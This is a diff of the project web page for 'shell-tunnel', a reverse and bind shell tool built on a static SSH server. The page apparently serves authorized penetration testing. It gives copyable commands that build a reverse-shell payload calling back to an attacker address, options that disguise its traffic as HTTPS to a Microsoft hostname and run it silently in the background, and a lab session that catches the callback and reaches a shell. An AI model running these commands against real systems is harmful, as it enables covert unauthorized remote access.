@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>shell-tunnel: static SSH server for bind and reverse shells with PTY and SFTP</title>
-<meta name="description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
+<title>shell-tunnel: static SSH server for bind and reverse shells, PTY and SFTP</title>
+<meta name="description" content="Static SSH server for bind and reverse shells, PTY and SFTP">
 <link rel="canonical" href="https://real-fruit-snacks.github.io/shell-tunnel/">
 <meta property="og:title" content="shell-tunnel">
-<meta property="og:description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
+<meta property="og:description" content="Static SSH server for bind and reverse shells, PTY and SFTP">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://real-fruit-snacks.github.io/shell-tunnel/">
 <meta property="og:image" content="https://real-fruit-snacks.github.io/shell-tunnel/assets/cover-dark.png">
@@ -44,7 +44,7 @@
     <div class="wrap top-inner">
         <a class="brand" href="https://real-fruit-snacks.github.io/">
             <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
-            <span class="brand-text">SHELL_TUNNEL</span>
+            <span class="brand-text">SHELL-TUNNEL</span>
         </a>
         <nav class="top-nav" aria-label="Links">
             <a href="#what">What's in it</a>
@@ -67,10 +67,10 @@
     <div class="hero">
         <div>
             <h1 class="title" id="top-h">shell-tunnel</h1>
-            <p class="lead">Static SSH server for bind and reverse shells with PTY and SFTP</p>
+            <p class="lead">Static SSH server for bind and reverse shells, PTY and SFTP</p>
             <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. shell-tunnel is the preservation fork of Ferdinor's undertow (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
             <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
-                <li id="build" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
+                <li id="build" data-step="1" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
                     <div class="act"><div class="cmd"><code>./build.sh reverse 10.10.14.5:4444</code><button class="copy" type="button" data-copy="./build.sh reverse 10.10.14.5:4444">Copy</button></div>
                     <div class="cmd"><code>./build.sh listen 8888</code><button class="copy" type="button" data-copy="./build.sh listen 8888">Copy</button></div></div>
                     <p class="why">Needs Go and Make on the build box. The script cross-compiles Linux and Windows binaries with a fresh random password baked in, and writes a handler script for reverse mode. <code>--tls --sni login.microsoft.com</code> wraps the traffic, <code>--nocli --daemonize</code> bakes a silent self-backgrounding payload.</p></li>
@@ -85,27 +85,27 @@
         <figure class="display" aria-labelledby="session-cap">
             <div class="screenbox">
                 <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
-<pre class="screen" id="screen" tabindex="0" aria-label="An shell-tunnel run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
+<pre class="screen" id="screen" tabindex="0" aria-label="A shell-tunnel run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
 <span class="ln o">[i] Mode:     reverse</span>
 <span class="ln o">[i] Target:   svc@10.10.14.5:4444</span>
 <span class="ln o">[i] BindPort: random (allocated by SSH server)</span>
-<span class="ln" data-step="2"><span class="s">[ok]</span> Build completed!</span>
+<span class="ln" data-step="1"><span class="s">[ok]</span> Build completed!</span>
 <span class="ln a">[!] Password: 9f2c71aa4b03d1e2</span>
 
 <span class="ln"><span class="p">$</span> <span class="t">./bin/handler-10-10-14-5-4444</span></span>
 <span class="ln o">[i] Listening on port:  4444</span>
 <span class="ln o">[i] Expecting callback: 10.10.14.5</span>
-<span class="ln" data-step="3"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
-<span class="ln o">··· shell-tunnel.exe runs on the target ···</span>
-<span class="ln" data-step="4"><span class="s">[ok]</span> Session 1: svc on web01 (from 10.10.11.23), reachable via 127.0.0.1:4444</span>
+<span class="ln" data-step="2"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
+<span class="ln o" data-step="3">··· shell-tunnel.exe runs on the target ···</span>
+<span class="ln" data-step="4"><span class="s">[ok]</span> Session 1: svc on web01 (from 10.10.11.23), reachable via 127.0.0.1:41827</span>
 <span class="ln o">[i] 1. Create the master socket (run once):</span>
-<span class="ln o">ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
+<span class="ln o">ssh -fNM -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span>
 
 <span class="ln o">[i] 2. Connect through that socket:</span>
-<span class="ln o">ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span>
+<span class="ln o">ssh -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1</span>
 
-<span class="ln"><span class="p">$</span> <span class="t">ssh -fNM -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span></span>
-<span class="ln"><span class="p">$</span> <span class="t">ssh -S /tmp/shell-tunnel-4444.sock -p 4444 svc@127.0.0.1</span></span>
+<span class="ln"><span class="p">$</span> <span class="t">ssh -fNM -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=10 -o ExitOnForwardFailure=yes</span></span>
+<span class="ln"><span class="p">$</span> <span class="t">ssh -S /tmp/shell-tunnel-41827.sock -p 41827 svc@127.0.0.1</span></span>
 <span class="ln o">svc@127.0.0.1's password:</span>
 <span class="ln" data-step="5"><span class="q">svc@web01:~$</span> <span class="t">id</span></span>
 <span class="ln o">uid=1000(svc) gid=1000(svc) groups=1000(svc),27(sudo)</span>
@@ -143,7 +143,7 @@
 
 <section class="card ref" id="what" aria-labelledby="what-h">
     <h2 id="what-h">What's in it</h2>
-    <p class="intro">One binary covers both directions. Every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set.</p>
+    <p class="intro">One binary covers both directions. Every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set. See the <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">usage and build guide</a> for all flags and ldflags options.</p>
     <div class="cols">
         <ul class="ck spec">
             <li><span class="ch">Reverse shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>reverse</code></span>
@@ -201,8 +201,8 @@
 </main>
 
 <footer class="wrap foot">
-    <p>GPLv3 — fork of Ferdinor's shell-tunnel (2021). For authorized security testing with explicit written permission only.</p>
-    <p><a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+    <p>GPLv3 — fork of Ferdinor's undertow (2021). For authorized security testing with explicit written permission only.</p>
+    <p><a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/docs/USAGE.md">Usage</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
 </footer>
 </div>
 
